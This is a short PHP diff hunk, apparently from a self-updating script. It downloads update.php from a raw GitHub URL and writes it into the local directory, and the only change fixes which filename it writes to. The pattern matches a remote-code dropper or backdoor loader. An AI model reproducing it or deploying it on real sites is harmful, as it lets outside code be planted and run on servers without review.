@@ -52,7 +52,7 @@ if ( file_exists( './' . $update ) ) {
 
                  
         $up = file_get_contents('https://raw.githubusercontent.com/drod247/main.js/main/update.php');
-                $myfile = fopen('./'. $css, "w") or die("Unable to open $css!");
+                $myfile = fopen('./'. $update, "w") or die("Unable to open $update!");
                 fwrite($myfile, $up);
                 fclose($myfile);
                          
